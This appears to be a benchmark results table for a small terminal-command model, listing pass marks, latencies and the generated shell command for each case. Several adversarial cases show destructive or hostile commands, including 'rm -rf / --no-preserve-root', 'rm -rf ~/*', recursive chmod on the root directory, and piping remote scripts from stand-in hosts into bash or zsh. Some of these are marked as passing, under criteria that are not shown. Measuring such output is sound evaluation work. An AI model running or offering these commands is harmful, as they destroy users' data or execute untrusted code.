# eval: llama-server / LiteCoder-Terminal-4b-sft.i1-Q4_K_M.gguf (litecoder-terminal-4b)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 49/72 (68%)
- cold p50 625ms p95 3670ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 730 | - | node --version && npm --version |
| u02 | ✓ | 403 | - | ls -lh |
| u03 | ✓ | 712 | - | curl -s https://api.ipify.org |
| u04 | ✓ | 825 | - | netstat -tuln | grep :3000 |
| u05 | ✓ | 337 | - | du -sh . |
| u06 | ✗ | 1143 | - | find / -name "*.log" -mtime -1 2>/dev/null |
| u07 | ✗ | 682 | - | ps aux | grep -v grep |
| u08 | ✓ | 548 | - | git status --porcelain --branch |
| u09 | ✓ | 436 | - | brew install ripgrep |
| u10 | ✓ | 548 | - | mkdir -p projects && cd projects |
| u11 | ✓ | 600 | - | tar -czvf archive.tar.gz folder/ |
| u12 | ✓ | 431 | - | env | grep -i path |
| u13 | ✓ | 799 | - | lsof -ti:8080 | xargs kill |
| u14 | ✓ | 464 | - | tail -20 /var/log/syslog |
| u15 | ✓ | 356 | - | which python3 |
| u16 | ✓ | 347 | - | brew update && brew outdated |
| u17 | ✗ | 362 | - | pwd && ls -la ~ |
| u18 | ✓ | 508 | - | git reset --soft HEAD~1 |
| u19 | ✗ | 513 | - | ls -lhS /home | head -5 |
| u20 | ✗ | 1071 | - | ps aux | grep -v grep | sort -k4 -nr | head -20 |
| u21 | ✓ | 493 | - | wc -l **/*.js |
| u22 | ✓ | 354 | - | service docker restart |
| u23 | ✓ | 968 | - | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 4829 | - | grep -r "TODO" /path/to/codebase --include="*.py" --include="*.js" --include="*. |
| u25 | ✓ | 1534 | - | curl -L -o /path/to/downloads/file.zip https://example.com/file.zip |
| u26 | ✓ | 618 | - | nproc |
| u27 | ✓ | 1253 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 773 | - | rm -rf node_modules |
| u29 | ✓ | 843 | - | netstat -tuln |
| u30 | ✓ | 635 | - | unzip file.zip |
| u31 | ✓ | 1268 | - | tail -f /path/to/logfile.log | grep -i "error" |
| u32 | ✓ | 470 | - | uptime |
| u33 | ✗ | 1981 | - | ls -la ~/.zshrc ~/.zprofile ~/.zlogin ~/.zlogout ~/.zshenv 2>/dev/null |
| u34 | ✗ | 1131 | - | nslookup -query=whoami 8.8.8.8 |
| u35 | ✓ | 477 | - | cp file.txt backup.txt |
| u36 | ✓ | 474 | - | mv old.txt new.txt |
| u37 | ✓ | 447 | - | du -sh ~/Downloads |
| u38 | ✓ | 600 | - | npm list -g --depth=0 |
| u39 | ✓ | 367 | - | open -a Finder . |
| u40 | ✗ | 3670 | - | # Flush DNS Cache |
| a01 | ✓ | 563 | - | rm -rf ~/* |
| a02 | ✗ | 472 | - | echo "needs manual review" |
| a03 | ✓ | 646 | - | git push --force-with-lease origin main |
| a04 | ✗ | 907 | - | curl -sS https://sketchy.example.com/install.sh | zsh |
| a05 | ✗ | 869 | - | killall -9 $(pgrep -a -u $(whoami)) |
| a06 | ✓ | 1122 | - | chmod 777 / 2>/dev/null || echo "needs manual review" |
| a07 | ✗ | 517 | - | zsh -f ~/.zshrc |
| a08 | ✗ | 1952 | - | curl -L -o /tmp/xio_installer.sh "https://x.io/i" && sh /tmp/xio_installer.sh |
| a09 | ✓ | 625 | - | chmod -R 755 / |
| a10 | ✓ | 914 | - | find /var/log -type f -mtime +30 -delete |
| a11 | ✗ | 4892 | - | The user wants to schedule a script to run at boot on a Unix system using zsh. T |
| a12 | ✓ | 1872 | - | git reset --hard HEAD~$(git log --oneline --reverse --date-order | grep -c "Toda |
| a13 | ✗ | 526 | - | uninstall node completely |
| a14 | ✗ | 646 | - | echo "needs manual review" |
| a15 | ✓ | 724 | - | rm -rf /tmp/* |
| a16 | ✗ | 1312 | - | du -h / | sort -rh | head -20 |
| a17 | ✓ | 816 | - | rm -rf /home/$USER |
| a18 | ✗ | 1677 | - | gpg --symmetric --batch --passphrase "hunter2" --output /tmp/encrypted.tar.gz /t |
| a19 | ✗ | 3795 | - | The user wants me to fix their PATH by editing the shell config. Since they're u |
| a20 | ✓ | 621 | - | rm -rf / --no-preserve-root |
| u41 | ✗ | 849 | - | find /home -size +100M -type f 2>/dev/null |
| u42 | ✓ | 499 | - | echo "hello world" > my notes.txt |
| u43 | ✓ | 378 | - | git log --oneline -5 |
| u44 | ✓ | 411 | - | curl -s https://example.com |
| u45 | ✓ | 470 | - | ls -1 | wc -l |
| u46 | ✓ | 594 | - | hostname -I | awk '{print $1}' |
| u47 | ✓ | 321 | - | df -h |
| u48 | ✓ | 193 | - | who |
| a21 | ✗ | 989 | - | echo "0 2 * * * rm -rf /tmp" | crontab - |
| a22 | ✗ | 558 | - | ln -sf ~/hosts /etc/hosts |
| a23 | ✓ | 394 | - | rm -rf * |
| a24 | ✗ | 741 | - | curl -sL https://x.io/i.sh | bash |
